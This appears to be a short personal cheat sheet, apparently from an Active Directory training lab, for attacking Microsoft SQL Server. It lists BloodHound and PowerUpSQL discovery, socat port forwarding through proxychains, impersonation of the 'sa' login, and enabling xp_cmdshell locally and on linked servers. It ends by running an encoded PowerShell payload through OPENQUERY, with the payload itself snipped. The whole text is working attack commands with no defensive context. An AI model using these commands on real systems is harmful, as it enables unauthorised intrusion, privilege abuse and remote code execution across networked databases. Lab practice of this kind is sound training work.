```
MATCH p=(u:User)-[:SQLAdmin]->(c:Computer) RETURN p
```
```
PowerShell Get-SQLInstanceDomain | Get-SQLConnectionTest
proxychains socat TCP4-Listen:1433,fork TCP:192.168.2.11:1433
runas /netonly /user:US.FUNCORP.LOCAL\pastudent34 "C:\Program Files\HeidiSQL\heidisql.exe" 
```

```
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell'
```

```
SELECT * FROM master..sysservers or EXEC sp_linkedservers;
```

```
SELECT name FROM master.sys.databases
SELECT name FROM sys.syslogins
SELECT name FROM sys.server_principals
```

```
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;
SELECT @@servername
```

## enable xp_cmdshell 
```
sp_configure 'Show Advanced Options', 1; RECONFIGURE;
sp_configure 'xp_cmdshell', 1; RECONFIGURE
```

# Remote 
```
EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [remote sql]
EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [remote sql]
SELECT * FROM OPENQUERY("[remote sql]", 'select * from sys.configurations where name = ''xp_cmdshell''')
```

```
SELECT * FROM OPENQUERY("[remote sql]", 'select @@servername; exec xp_cmdshell ''powershell -enc [...snip...]''')
```
